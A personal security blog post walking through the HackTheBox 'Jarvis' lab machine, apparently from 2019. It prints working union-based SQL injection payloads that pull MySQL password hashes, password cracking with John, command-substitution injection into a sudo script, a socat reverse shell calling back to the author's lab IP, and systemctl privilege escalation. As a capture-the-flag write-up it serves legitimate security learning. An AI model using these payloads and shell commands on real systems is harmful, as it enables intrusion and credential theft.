<!DOCTYPE html><html lang="en" data-mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.2.2" /><meta property="og:title" content="HackTheBox: Jarvis" /><meta property="og:locale" content="en" /><meta name="description" content="Recon:" /><meta property="og:description" content="Recon:" /><link rel="canonical" href="https://megawattsec.com/posts/hackthebox-jarvis/" /><meta property="og:url" content="https://megawattsec.com/posts/hackthebox-jarvis/" /><meta property="og:site_name" content="MegaWattSec" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2019-08-19T10:04:56-04:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="HackTheBox: Jarvis" /><meta name="twitter:site" content="@megawattsec" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2022-05-12T15:06:06-04:00","datePublished":"2019-08-19T10:04:56-04:00","description":"Recon:","headline":"HackTheBox: Jarvis","mainEntityOfPage":{"@type":"WebPage","@id":"https://megawattsec.com/posts/hackthebox-jarvis/"},"url":"https://megawattsec.com/posts/hackthebox-jarvis/"}</script><title>HackTheBox: Jarvis | MegaWattSec</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="MegaWattSec"><meta name="application-name" content="MegaWattSec"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script><body data-spy="scroll" data-target="#toc" data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src=" /assets/img/jamack_close.jpg " alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">MegaWattSec</a></div><div class="site-subtitle font-italic">Adventures of a Forever-Newb</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <a href="https://github.com/megawattsec" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/megawattsec" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['megawattsec','gmail.com'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>HackTheBox: Jarvis</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>HackTheBox: Jarvis</h1><div class="post-meta text-muted"><div> By <em> <a href="https://twitter.com/megawattsec">Dustin</a> </em></div><div class="d-flex"><div> <span> Posted <em class="timeago" data-ts="1566223496" data-toggle="tooltip" data-placement="bottom" data-tooltip-df="llll" > 2019-08-19 </em> </span> <span> Updated <em class="timeago" data-ts="1652382366" data-toggle="tooltip" data-placement="bottom" data-tooltip-df="llll" > 2022-05-12 </em> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="1693 words"> <em>9 min</em> read</span></div></div></div><div class="post-content"><h2 id="recon"><span class="mr-2">Recon:</span><a href="#recon" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p><img class="alignnone wp-image-122" data-src="/assets/img/2019/08/html_cover.png" data-proofer-ignore></p><p>The website isn’t bare, but most of the links found don’t actually go anywhere. The only page with anything really going on is ‘Rooms’, where you’ll find the links to the rooms are PHP requests.</p><h3 id="port-scan"><span class="mr-2">Port Scan</span><a href="#port-scan" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><p>After a thorough port-scan with Nmap you’ll notice there are the usual ports open:</p><figure class="highlight"><pre><code class="language-plain_text" data-lang="plain_text">PORT      STATE SERVICE REASON         VERSION
22/tcp    open  ssh     syn-ack ttl 63 OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
| ssh-hostkey: 
|   2048 03:f3:4e:22:36:3e:3b:81:30:79:ed:49:67:65:16:67 (RSA)
|   256 25:d8:08:a8:4d:6d:e8:d2:f8:43:4a:2c:20:c8:5a:f6 (ECDSA)
|_  256 77:d4:ae:1f:b0:be:15:1f:f8:cd:c8:15:3a:c3:69:e1 (ED25519)
80/tcp    open  http    syn-ack ttl 63 Apache httpd 2.4.25 ((Debian))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Stark Hotel</code></pre></figure><p>And also a high port that’s serving a webpage:</p><figure class="highlight"><pre><code class="language-plain_text" data-lang="plain_text">64999/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.25 ((Debian))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Site doesn't have a title (text/html).</code></pre></figure><h3 id="web-directory-scan"><span class="mr-2">Web Directory Scan</span><a href="#web-directory-scan" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><p>Performing a directory scan on the regular port 80 shows several folders, and PHPMyAdmin, which is interesting.</p><figure class="highlight"><pre><code class="language-plain_text" data-lang="plain_text">root@kali:~# gobuster -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u supersecurehotel.htb

=====================================================
Gobuster v2.0.0              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://supersecurehotel.htb/
[+] Threads      : 10
[+] Wordlist     : /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes : 200,204,301,302,307,403
[+] Timeout      : 10s
=====================================================
2019/07/24 12:16:13 Starting gobuster
=====================================================
/images (Status: 301)
/css (Status: 301)
/js (Status: 301)
/fonts (Status: 301)
/phpmyadmin (Status: 301)
/sass (Status: 301)
/server-status (Status: 403)
=====================================================
2019/07/24 12:30:34 Finished
=====================================================</code></pre></figure><h2 id="web-hacking"><span class="mr-2">Web Hacking</span><a href="#web-hacking" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><h3 id="investigating-phpmyadmin"><span class="mr-2">Investigating PHPMyAdmin</span><a href="#investigating-phpmyadmin" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><p>I tried logging into the PHPMyAdmin with some low-hanging fruit credentials, but no luck there. However, it did give an error message that told my the database being used is MySQL.</p><p><img class="alignnone wp-image-141" data-src="/assets/img/2019/08/js_phpmyadmin_login.png" data-proofer-ignore></p><h3 id="investigating-roomphp"><span class="mr-2">Investigating room.php</span><a href="#investigating-roomphp" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><p>Looking into the source code from the site, I found only one lookup that was functional, and that’s the room.php lookup. The query could be going to a SQL statement to generate the room details.</p><p>Trying a few common things with the input was fruitless. Then I tried to start smaller and see if it’ll accept an apostrophe. It doesn’t. Instead, it returns a broken page like so:</p><p><img class="alignnone wp-image-143 size-full" data-src="/assets/img/2019/08/js_room_broken-1.png" data-proofer-ignore></p><p>Then I tried to encode the apostrophe as URL hex code %27 and that didn’t work either. But then I tried a double URL encoding of %2527 and bingo! There was a normal page view.<br /> http://10.10.10.143/room.php?cod=3%2527</p><p><img class="alignnone wp-image-144 size-full" data-src="/assets/img/2019/08/js_room_normal.png" data-proofer-ignore></p><h3 id="sql-injection"><span class="mr-2">SQL Injection</span><a href="#sql-injection" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><p>With knowing there’s a SQL injection on the page, I went into trying some common things to leverage the vulnerability.</p><p><code class="language-plaintext highlighter-rouge">room.php?cod=1%2527 or 1=1</code></p><p>That returns the first record in the table, which is the first room “1”. So either there’s a LIMIT operator, or the PHP code only selects the first result to put into the page.</p><p>Also, some experimentation shows that only the first quote character needs to be double encoded, and other important characters tested are not even filtered!</p><p><code class="language-plaintext highlighter-rouge">room.php?cod=1%2527 and ('_'='_')</code></p><p>… this actually returns a functional result.</p><p>At first, I was doing many many queries using EXIST to figure out the shape of the database, but then I found an article online that showed me a <em>much</em> <em>mo better</em> process with SQLi. I’ve since lost track of the article, sorry.</p><p>Step 1 – Figure out the shape of the table we’re working with. First get the number of columns in the current table, for use with UNION statements later.</p><p>I began using an ORDER BY statement and a ‘1’ for the column count.</p><p><code class="language-plaintext highlighter-rouge">room.php?cod=1%2527 order by 1</code></p><p>Then, increment the column count until it returns an invalid response.</p><p><code class="language-plaintext highlighter-rouge">room.php?cod=1%2527 order by 8</code></p><p>Since ‘8’ is where it breaks, that means 7 columns are good, and that’s what we need for UNIONs.</p><p>Sending a UNION statement with all columns numbered will show where each piece of information goes in the result. One thing, it needs a blank page to start with, so I gave it an invalid room number.</p><p><code class="language-plaintext highlighter-rouge">room.php?cod=99%2527 union select 1,2,3,4,5,6,7</code></p><p><img class="alignnone wp-image-145 size-full" data-src="/assets/img/2019/08/j_sqli_labels.png" data-proofer-ignore></p><p>Step 2 – Request some basic information about the database and it’s structure.</p><p><code class="language-plaintext highlighter-rouge">room.php?cod=99%2527 union select 1,@@datadir,@@basedir,database(),user(),6,7</code></p><p> </p><p><img class="alignnone size-full wp-image-190" data-src="/assets/img/2019/08/js_sqli_basic.png" data-proofer-ignore></p><p>Step 3 – After getting the database name ‘hotel’, I extracted the table and column information.</p><p>The below statement retrieves the table name.</p><p><code class="language-plaintext highlighter-rouge">room.php?cod=99%2527 UNION SELECT 1,table_name,3,4,5,6,7 FROM information_schema.columns where table_schema like 'hotel'</code></p><p><img class="alignnone size-full wp-image-150" data-src="/assets/img/2019/08/js_sqli_table.png" data-proofer-ignore></p><p>After that, use a statement like below to extract the columns. Increment the LIMIT operator to get the data out one at a time.</p><p><code class="language-plaintext highlighter-rouge">room.php?cod=99%2527 UNION SELECT 1,column_name,3,4,5,6,7 FROM information_schema.columns where table_name like 'room' limit 0,1</code></p><p class="lang:zsh highlight:0 decode:true"> <img class="alignnone size-full wp-image-151" data-src="/assets/img/2019/08/js_sqli_column1.png" data-proofer-ignore></p><p><code class="language-plaintext highlighter-rouge">room.php?cod=99%2527 UNION SELECT 1,column_name,3,4,5,6,7 FROM information_schema.columns where table_name like 'room' limit 1,1</code></p><p><img class="alignnone size-full wp-image-152" data-src="/assets/img/2019/08/js_sqli_column2.png" data-proofer-ignore></p><p>After going through all of the columns until the page breaks, I ended up with the following:</p><blockquote><h4 id="room"><span class="mr-2">Room</span><a href="#room" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4></h4><p>1- cod<br /> 2- name<br /> 3- price<br /> 4- descrip<br /> 5- star<br /> 6- image<br /> 7- mini</p></blockquote><p>This is all good info, but it didn’t get me what I wanted, which was the ‘user’ info. The query for extracting the tables doesn’t show us any more tables besides ‘hotel’. I knew there had to be more, so I tried another table extraction.</p><p><code class="language-plaintext highlighter-rouge">room.php?cod=99%2527 UNION SELECT ALL 1,table_name,3,4,table_name,6,7 FROM information_schema.columns where column_name like 'user' limit 0, 1</code></p><p><img class="alignnone size-full wp-image-154" data-src="/assets/img/2019/08/js_sqli_table2.png" data-proofer-ignore></p><p>Now that was getting me other tables, and ones with ‘user’ fields! Incrementing the LIMIT operator resulted in quite a lot of tables.</p><blockquote><h4 id="tables"><span class="mr-2">Tables</span><a href="#tables" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4></h4><p>PROCESSLIST<br /> USER_STATISTICS<br /> columns_priv<br /> db<br /> procs_priv<br /> proxies_priv<br /> roles_mapping<br /> tables_priv<br /> user<br /> accounts<br /> events_stages_summary_by_account_by_event_name<br /> events_stages_summary_by_user_by_event_name<br /> events_statements_summary_by_account_by_event_name<br /> events_statements_summary_by_user_by_event_name<br /> events_waits_summary_by_account_by_event_name<br /> events_waits_summary_by_user_by_event_name<br /> setup_actors<br /> users</p></blockquote><p>Two tables stood out, ‘user’ and ‘users’. It was time to do a little more investigating by getting the columns of each of these tables using similar statements as before. The resulting table structures are:</p><blockquote><h4 id="user"><span class="mr-2">user</span><a href="#user" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4></h4><p>Host<br /> User<br /> Password<br /> Select_priv<br /> Insert_priv<br /> Update_priv<br /> Delete_priv<br /> Create_priv<br /> Drop_priv<br /> Reload_priv<br /> Shutdown_priv<br /> Process_priv<br /> File_priv<br /> Grant_priv<br /> References_priv<br /> Index_priv<br /> Alter_priv<br /> Show_db_priv<br /> Super_priv<br /> Create_tmp_table_priv<br /> Lock_tables_priv<br /> Execute_priv<br /> Repl_slave_priv<br /> Repl_client_priv<br /> Create_view_priv<br /> Show_view_priv<br /> Create_routine_priv<br /> Alter_routine_priv<br /> Create_user_priv<br /> Event_priv<br /> Trigger_priv<br /> Create_tablespace_priv<br /> ssl_type<br /> ssl_cipher<br /> x509_issuer<br /> x509_subject<br /> max_questions<br /> max_updates<br /> max_connections<br /> max_user_connections<br /> plugin<br /> authentication_string<br /> password_expired<br /> is_role<br /> default_role<br /> max_statement_time</p><h4 id="users"><span class="mr-2">users</span><a href="#users" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4></h4><p>USER<br /> CURRENT_CONNECTIONS<br /> TOTAL_CONNECTIONS</p></blockquote><p>The only one with a ‘password’ column is the table ‘user’. I already knew that the table is not in the ‘hotel’ database, so I needed to figure out which one has it.</p><p> </p><p><code class="language-plaintext highlighter-rouge">room.php?cod=99%2527 UNION SELECT ALL 1,table_schema,3,4,table_name,6,7 FROM information_schema.columns where table_name like 'user' limit 0,1</code></p><p> </p><p><img class="alignnone size-full wp-image-156" data-src="/assets/img/2019/08/js_sqli_database2.png" data-proofer-ignore></p><p>It is ‘MySQL’. With that needed bit of info, a statement could be made to extract the credentials.</p><p>Step 4 – Extract the desired fields.</p><p><code class="language-plaintext highlighter-rouge">room.php?cod=99%2527 UNION SELECT ALL 1,Password,3,4,user,6,7 FROM mysql.user limit 0,1</code></p><p><img class="alignnone size-full wp-image-157" data-src="/assets/img/2019/08/js_sqli_password.png" data-proofer-ignore></p><h3 id="password-cracking"><span class="mr-2">Password Cracking</span><a href="#password-cracking" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><p>To crack the password, I used John the Ripper. But John needs to know what type of hash it is, so I used a program ‘hash-identifier’ to help with that.</p><p><img class="alignnone size-full wp-image-160" data-src="/assets/img/2019/08/js_pw_hashid.png" data-proofer-ignore></p><p>It shows a MySQL5 – SHA1 hash.</p><p>Putting this into John looks like this:</p><p><code class="language-plaintext highlighter-rouge">john &amp;#8211;wordlist=/usr/share/wordlists/rockyou.txt &amp;#8211;format:MySQL-sha1 hashes.txt</code></p><p><img class="alignnone size-full wp-image-161" data-src="/assets/img/2019/08/js_pw_john.png" data-proofer-ignore></p><p>The password is <strong>‘imissyou’</strong></p><p> </p><h3 id="phpmyadmin"><span class="mr-2">PHPMYADMIN</span><a href="#phpmyadmin" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><p>With credentials found, it was time to go back into the PHPMyAdmin page and see if they work.</p><p>Guess what… it did!</p><p><img class="alignnone wp-image-166 size-full" data-src="/assets/img/2019/08/js_panel_version.png" data-proofer-ignore></p><p>This screenshot shows where to find the version info for PHPMyAdmin once it’s logged in.</p><p>Knowing the version, you can do a google search and find out there’s a documented local file include issue.</p><h2 id="server-side-hacking"><span class="mr-2">Server Side Hacking</span><a href="#server-side-hacking" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><h3 id="exploitation"><span class="mr-2">Exploitation</span><a href="#exploitation" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><p>Look in Metasploit and you’ll see an exploit module for the LFI vulnerability.</p><p><img class="alignnone size-full wp-image-168" data-src="/assets/img/2019/08/js_panel_metasploit.png" data-proofer-ignore></p><p><img class="alignnone size-full wp-image-169" data-src="/assets/img/2019/08/js_panel_metasploit_options.png" data-proofer-ignore></p><p>Once I had a meterpreter shell up, I uploaded “LinEnum.sh”.</p><p><img class="alignnone size-full wp-image-172" data-src="/assets/img/2019/08/js_panel_linenum_upload.png" data-proofer-ignore></p><p>LinEnum is a script to get a lot of enumerated info about the system at once. When it’s run against this host, there’s one particular bit of information that looks really interesting.</p><p><img class="alignnone size-full wp-image-171" data-src="/assets/img/2019/08/js_panel_linenum.png" data-proofer-ignore></p><p>It’s useful later for a privilege escalation once we get into the user account ‘pepper’.</p><p>The most probable way of getting a priv escalation to the user ‘pepper’ is through a script that can be run with sudo:</p><p><img class="alignnone wp-image-173" data-src="/assets/img/2019/08/js_panel_linenum_sudo.png" data-proofer-ignore></p><h3 id="user-escalation"><span class="mr-2">User Escalation</span><a href="#user-escalation" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><p><code class="language-plaintext highlighter-rouge">/var/www/Admin-Utilities/simpler.py</code></p><p>The script can be run as sudo by ‘www-data’!</p><p><img class="alignnone size-full wp-image-180" data-src="/assets/img/2019/08/js_simpler_output.png" data-proofer-ignore></p><p>Wasn’t sure what to do with it, so I used ‘cat’ on it and copied the output to Notepad++ for studying.</p><p>I found one probable attack point in the code:</p><p><img class="alignnone size-full wp-image-175" data-src="/assets/img/2019/08/js_simpler_code.png" data-proofer-ignore></p><p>Looks like command substitution can be exploited here since the shell execution characters “$()” aren’t filtered!</p><p>I tried to get a shell to work through simpler.py and failed, many times. So to at least get somewhere, I extracted the user.txt with these commands:</p><p><code class="language-plaintext highlighter-rouge">sudo -u pepper ./simpler.py -p</code>  To get into the script, then <code class="language-plaintext highlighter-rouge">$(cat /home/pepper/user.txt &gt;test.txt)</code> inside of the script.</p><p>To exploit systemctl for the root flag, I had to get a shell working through the simpler.py script.</p><p>After trying MANY things, I finally got it to work with a SOCAT shell using the following steps.</p><p>1) Set up SOCAT on my kali box with:</p><p><code class="language-plaintext highlighter-rouge">socat file:</code>tty<code class="language-plaintext highlighter-rouge">,raw,echo=0 TCP-listen:5555</code></p><p>2) After dropping into a shell from meterpreter:</p><p><code class="language-plaintext highlighter-rouge">sudo -u pepper /var/www/Admin-Utilities/simpler.py -p</code></p><p>3) From within simpler.py:</p><p><code class="language-plaintext highlighter-rouge">$(bash)</code></p><p>This allowed me to bypass the filtered characters since I need some of them. This bash shell will only allow a single command due to limitations in the injection vuln.</p><p>Then set up a socat connection with <code class="language-plaintext highlighter-rouge">socat exec:’bash -li’,pty,stderr,setsid,sigint,sane tcp:10.10.15.29:5555</code></p><p><img class="alignnone size-full wp-image-182" data-src="/assets/img/2019/08/js_simpler_socat.png" data-proofer-ignore></p><h3 id="root-escalation"><span class="mr-2">Root Escalation</span><a href="#root-escalation" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><p>Tried to use the ‘systemctl’ command for the next escalation. My first plan was to see if a shell breakout from ‘less’ through ‘systemctl status’ would give me root permissions.</p><p>But I got an error that the shell isn’t good enough:</p><p><img class="alignnone size-full wp-image-184" data-src="/assets/img/2019/08/js_systemctl_status.png" data-proofer-ignore></p><p>… and when I broke out of ‘less’, it didn’t give root permissions as I had hoped.</p><p>I did some research on what ‘systemctl’ is used for and figured I could create my own service, which does certainly run as root and use it to spawn a shell to use.</p><p>Here’s a very simple service setup that I used:</p><p><img class="alignnone size-full wp-image-185" data-src="/assets/img/2019/08/js_systemctl_service.png" data-proofer-ignore></p><p>And my script that is referenced in the service:</p><p><img class="alignnone size-full wp-image-186" data-src="/assets/img/2019/08/js_systemctl_service_script.png" data-proofer-ignore></p><p>Afterward, I realized it would have been more efficient to put the script command directly in the service setup, but whatever, it works this way too.</p><p>I first tried making it in the /tmp directory, but when using ‘systemctl’ on it I’d get an error about the file not found!</p><p>Eventually, I realized it’s because the tmp folder has the sticky bit set where only I can see the files I make in there, so the systemctl was operating under another UID, and couldn’t find it.</p><p>Then I moved the files to pepper’s home directory and it worked beautifully!</p><p>See the following screenshot for the command to get the service to work:</p><p><img class="alignnone size-full wp-image-187" data-src="/assets/img/2019/08/js_systemctl_service_run.png" data-proofer-ignore></p><p>And proof on my box:</p><p><img class="alignnone size-full wp-image-188" data-src="/assets/img/2019/08/js_root_proof.png" data-proofer-ignore></p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/walkthrough/'>Walkthrough</a>, <a href='/categories/hackthebox/'>HackTheBox</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/linux/" class="post-tag no-text-decoration" >Linux</a> <a href="/tags/sqli/" class="post-tag no-text-decoration" >sqli</a> <a href="/tags/mysql/" class="post-tag no-text-decoration" >mysql</a> <a href="/tags/phpmyadmin/" class="post-tag no-text-decoration" >phpmyadmin</a> <a href="/tags/lfi/" class="post-tag no-text-decoration" >lfi</a> <a href="/tags/socat/" class="post-tag no-text-decoration" >socat</a> <a href="/tags/systemctl/" class="post-tag no-text-decoration" >systemctl</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=HackTheBox: Jarvis - MegaWattSec&amp;url=https://megawattsec.com/posts/hackthebox-jarvis/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=HackTheBox: Jarvis - MegaWattSec&amp;u=https://megawattsec.com/posts/hackthebox-jarvis/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=https://megawattsec.com/posts/hackthebox-jarvis/&amp;text=HackTheBox: Jarvis - MegaWattSec" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" data-title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recently Updated</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/hackthebox-haystack/">HackTheBox: Haystack</a><li><a href="/posts/hackthebox-craft/">HackTheBox: Craft</a><li><a href="/posts/hackthebox-bastion/">HackTheBox: Bastion</a><li><a href="/posts/hackthebox-jarvis/">HackTheBox: Jarvis</a><li><a href="/posts/hackthebox-swagshop/">HackTheBox: SwagShop</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/web/">web</a> <a class="post-tag" href="/tags/linux/">Linux</a> <a class="post-tag" href="/tags/mysql/">mysql</a> <a class="post-tag" href="/tags/perl/">perl</a> <a class="post-tag" href="/tags/sqli/">sqli</a> <a class="post-tag" href="/tags/anti-csrf/">anti-csrf</a> <a class="post-tag" href="/tags/api/">api</a> <a class="post-tag" href="/tags/cve-2019-9185/">CVE-2019-9185</a> <a class="post-tag" href="/tags/docker/">docker</a> <a class="post-tag" href="/tags/elasticsearch/">elasticsearch</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="tail-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/hackthebox-craft/"><div class="card-body"> <em class="timeago small" data-ts="1575921294" > 2019-12-09 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>HackTheBox: Craft</h3><div class="text-muted small"><p> Recon and Scans NMAP Here is the output from Nmap, it shows several ports open. {% highlight plain_text %} nmap -n -Pn -sC -sV -p- 10.10.10.110 Starting Nmap 7.80 ( https://nmap.org ) at 2019-...</p></div></div></a></div><div class="card"> <a href="/posts/hackthebox-haystack/"><div class="card-body"> <em class="timeago small" data-ts="1569939718" > 2019-10-01 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>HackTheBox: Haystack</h3><div class="text-muted small"><p> Scans {% highlight plain_text %} Starting Nmap 7.80 ( https://nmap.org ) at 2019-10-01 09:16 EDT Nmap scan report for 10.10.10.115 Host is up, received user-set (0.24s latency). PORT STATE SERVIC...</p></div></div></a></div><div class="card"> <a href="/posts/hackthebox-swagshop/"><div class="card-body"> <em class="timeago small" data-ts="1566232827" > 2019-08-19 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>HackTheBox: SwagShop</h3><div class="text-muted small"><p> Recon This site is a basic e-commerce site with just a few products filled in as examples. Magento is the platform and it’s very well-known. Port Scan NMAP doesn’t show anything out of the ord...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/hackthebox-bastion/" class="btn btn-outline-primary" prompt="Older"><p>HackTheBox: Bastion</p></a> <a href="/posts/hackthebox-swagshop/" class="btn btn-outline-primary" prompt="Newer"><p>HackTheBox: SwagShop</p></a></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center text-muted"><div class="footer-left"><p class="mb-0"> © 2022 <a href="https://twitter.com/megawattsec">Dustin</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/web/">web</a> <a class="post-tag" href="/tags/linux/">Linux</a> <a class="post-tag" href="/tags/mysql/">mysql</a> <a class="post-tag" href="/tags/perl/">perl</a> <a class="post-tag" href="/tags/sqli/">sqli</a> <a class="post-tag" 